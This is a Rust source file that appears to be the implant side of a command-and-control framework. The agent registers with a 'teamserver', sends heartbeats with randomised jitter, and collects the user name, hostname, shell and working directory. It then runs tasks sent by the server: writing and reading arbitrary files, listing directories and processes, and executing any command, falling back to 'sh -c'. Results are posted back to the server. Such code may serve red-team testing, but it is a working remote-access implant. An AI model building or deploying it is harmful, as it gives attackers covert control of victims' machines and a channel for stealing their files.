use crate::config::AgentConfig;
use crate::protocol::{AgentRegistration, HeartbeatRequest, TaskMessage, TaskResult, TelemetryPayload};
use crate::state::AgentState;
use base64::{engine::general_purpose, Engine as _};
use hostname::get;
use log::{error, info};
use rand::Rng;
use std::collections::HashMap;
use std::env;
use std::fs;
use std::io::ErrorKind;
use std::path::Path;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use sysinfo::{ProcessesToUpdate, System};
use tokio::process::Command;
use tokio::time::timeout;

/// Collects metadata about the current environment.
///
/// This function is separated from `run` to make it easier to unit test metadata
/// collection without requiring a live server.
pub fn collect_metadata() -> HashMap<String, String> {
    let mut metadata: HashMap<String, String> = HashMap::new();
    metadata.insert("user".to_string(), whoami::username());
    metadata.insert(
        "cwd".to_string(),
        env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_default(),
    );
    if let Ok(shell) = env::var("SHELL") {
        metadata.insert("shell".to_string(), shell);
    }
    metadata
}

/// Builds a registration payload for the current agent.
///
/// This is factored out for easy unit testing and for ensuring consistent behavior
/// across platforms.
pub fn build_registration(agent_id: &str) -> anyhow::Result<AgentRegistration> {
    let hostname = get()?.to_string_lossy().into_owned();

    Ok(AgentRegistration {
        agent_id: agent_id.to_string(),
        os: env::consts::OS.to_string(),
        arch: env::consts::ARCH.to_string(),
        hostname,
        version: env!("CARGO_PKG_VERSION").to_string(),
        metadata: collect_metadata(),
    })
}

pub async fn run() -> anyhow::Result<()> {
    let cfg = AgentConfig::load();
    info!("agent configuration: {:#?}", cfg);

    let mut state = match AgentState::load() {
        Some(s) => s,
        None => AgentState {
            agent_id: uuid::Uuid::new_v4().to_string(),
            token: None,
        },
    };

    let client = reqwest::Client::new();

    // Register with the teamserver if we don't have a token yet.
    if state.token.is_none() {
        info!("registering agent with teamserver");

        let reg = build_registration(&state.agent_id)?;

        let resp = client
            .post(format!("{}/api/register", cfg.server_url))
            .json(&reg)
            .send()
            .await?;

        if !resp.status().is_success() {
            return Err(anyhow::anyhow!("register failed: {}", resp.status()));
        }

        let body: serde_json::Value = resp.json().await?;
        if let Some(token) = body.get("token").and_then(|v| v.as_str()) {
            state.token = Some(token.to_string());
            state.save()?;
            info!("received agent token");
        } else {
            return Err(anyhow::anyhow!("register response missing token"));
        }
    }

    loop {
        let uptime = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();

        let mut sys = System::new_all();
        sys.refresh_all();
        let cpu = sys.global_cpu_usage();
        let memory = sys.used_memory();

        let telemetry = TelemetryPayload {
            agent_id: state.agent_id.clone(),
            cpu: cpu as f64,
            memory,
            uptime,
            timestamp: chrono::Utc::now().to_rfc3339(),
        };

        let hb = HeartbeatRequest {
            agent_id: state.agent_id.clone(),
            token: state.token.clone().unwrap_or_default(),
            telemetry,
        };

        let resp = client
            .post(format!("{}/api/heartbeat", cfg.server_url))
            .json(&hb)
            .send()
            .await;

        match resp {
            Ok(r) if r.status().is_success() => {
                info!("heartbeat successful");

                if let Ok(body) = r.json::<serde_json::Value>().await {
                    if let Some(tasks) = body.get("tasks") {
                        if let Ok(tasks) = serde_json::from_value::<Vec<TaskMessage>>(tasks.clone()) {
                            for task in tasks {
                                let result = execute_task(&state, task).await;
                                if let Err(e) = submit_task_result(&client, &cfg, &result).await {
                                    error!("failed to submit task result: {}", e);
                                }
                            }
                        }
                    }
                }
            }
            Ok(r) => {
                error!("heartbeat failed: {}", r.status());
            }
            Err(e) => {
                error!("heartbeat error: {}", e);
            }
        }

        let jitter = rand::thread_rng().gen_range(0..cfg.heartbeat_interval);
        let delay = Duration::from_secs(cfg.heartbeat_interval + jitter);
        tokio::time::sleep(delay).await;
    }
}

async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
    let build_result = |status: &str, output: String, error: Option<String>| TaskResult {
        agent_id: state.agent_id.clone(),
        token: state.token.clone().unwrap_or_default(),
        task_id: task.task_id.clone(),
        status: status.to_string(),
        output,
        error,
        timestamp: chrono::Utc::now().to_rfc3339(),
    };

    match task.command.as_str() {
        "upload" => {
            if task.args.len() < 2 {
                return build_result(
                    "error",
                    "".to_string(),
                    Some("upload requires <path> <base64-data>".to_string()),
                );
            }

            let path = Path::new(&task.args[0]);
            let data = task.args[1].as_str();
            match general_purpose::STANDARD.decode(data) {
                Ok(bytes) => match fs::write(path, bytes) {
                    Ok(_) => build_result("success", "uploaded".to_string(), None),
                    Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
                },
                Err(e) => {
                    let e: base64::DecodeError = e;
                    build_result("error", "".to_string(), Some(e.to_string()))
                }
            }
        }
        "download" => {
            if task.args.is_empty() {
                return build_result(
                    "error",
                    "".to_string(),
                    Some("download requires <path>".to_string()),
                );
            }

            let path = Path::new(&task.args[0]);
            match fs::read(path) {
                Ok(bytes) => build_result("success", general_purpose::STANDARD.encode(&bytes), None),
                Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
            }
        }
        "ls" => {
            let path = task.args.get(0).map(|p| p.as_str()).unwrap_or(".");
            match fs::read_dir(path) {
                Ok(entries) => {
                    let mut lines = Vec::new();
                    for entry in entries.flatten() {
                        let name = match entry.file_name().into_string() {
                            Ok(n) => n,
                            Err(_) => continue,
                        };
                        // Skip hidden files and some common noise directories.
                        if name.starts_with('.') {
                            continue;
                        }
                        if name.starts_with("go-build") || name.starts_with("systemd-private-") {
                            continue;
                        }
                        let kind = if entry.metadata().map(|m| m.is_dir()).unwrap_or(false) {
                            "dir"
                        } else {
                            "file"
                        };
                        lines.push(format!("{} {}
", kind, name));
                        if lines.len() >= 200 {
                            lines.push("...truncated...\n".to_string());
                            break;
                        }
                    }
                    build_result("success", lines.join(""), None)
                }
                Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
            }
        }
        "ps" => {
            let mut sys = System::new_all();
            sys.refresh_processes(ProcessesToUpdate::All, true);
            let mut lines = Vec::new();
            for (pid, process) in sys.processes() {
                lines.push(format!(
                    "{}\t{}\n",
                    pid,
                    process.name().to_string_lossy(),
                ));
            }
            build_result("success", lines.join(""), None)
        }
        "pwd" | "cwd" => match env::current_dir() {
            Ok(cwd) => build_result("success", cwd.display().to_string(), None),
            Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
        },
        _ => {
            let deadline = Duration::from_secs(task.timeout_seconds);

            // Try running the command directly. If the binary isn't found, try via shell.
            let run_direct = async {
                let mut command = Command::new(&task.command);
                command.args(&task.args);
                timeout(deadline, command.output()).await
            };

            let result = match run_direct.await {
                Ok(Ok(output)) => Some((output, "".to_string())),
                Ok(Err(e)) if e.kind() == ErrorKind::NotFound => None,
                Ok(Err(e)) => {
                    return build_result("error", "".to_string(), Some(e.to_string()));
                }
                Err(_) => {
                    return build_result("timeout", "".to_string(), Some("task timed out".to_string()));
                }
            };

            let output = if let Some((output, _)) = result {
                output
            } else {
                // Fallback to shell execution for builtins or missing binary.
                let mut shell = Command::new("sh");
                shell.arg("-c");
                let full = format!("{} {}", task.command, task.args.join(" "));
                shell.arg(full);
                match timeout(deadline, shell.output()).await {
                    Ok(Ok(output)) => output,
                    Ok(Err(e)) => return build_result("error", "".to_string(), Some(e.to_string())),
                    Err(_) => return build_result("timeout", "".to_string(), Some("task timed out".to_string())),
                }
            };

            let output_text = String::from_utf8_lossy(&output.stdout).to_string();
            let error_text = String::from_utf8_lossy(&output.stderr).to_string();
            let status_str = if output.status.success() { "success" } else { "error" };
            build_result(
                status_str,
                output_text,
                if error_text.is_empty() { None } else { Some(error_text) },
            )
        }
    }
}

async fn submit_task_result(
    client: &reqwest::Client,
    cfg: &AgentConfig,
    result: &TaskResult,
) -> anyhow::Result<()> {
    let resp = client
        .post(format!("{}/api/task/result", cfg.server_url))
        .json(result)
        .send()
        .await?;

    if !resp.status().is_success() {
        Err(anyhow::anyhow!("failed to submit task result: {}", resp.status()))
    } else {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    #[test]
    fn test_build_registration_os_compatibility() {
        let reg = build_registration("test-agent").expect("build_registration should succeed");

        // Ensure the OS string is one of the expected targets for this project.
        // This guards against unexpected changes in Rust's `env::consts::OS` values.
        let allowed = ["linux", "macos", "windows", "freebsd", "netbsd", "openbsd"];
        assert!(
            allowed.contains(&reg.os.as_str()),
            "unexpected os value: {}",
            reg.os
        );

        // Ensure architecture string is not empty and looks reasonable.
        assert!(!reg.arch.is_empty(), "arch should not be empty");
    }

    #[test]
    fn test_collect_metadata_contains_required_fields() {
        let metadata = collect_metadata();
        assert!(metadata.contains_key("user"));
        assert!(metadata.contains_key("cwd"));

        // Ensure cwd is a valid path.
        if let Some(cwd) = metadata.get("cwd") {
            assert!(Path::new(cwd).exists(), "cwd value should point to an existing directory");
        }
    }
}
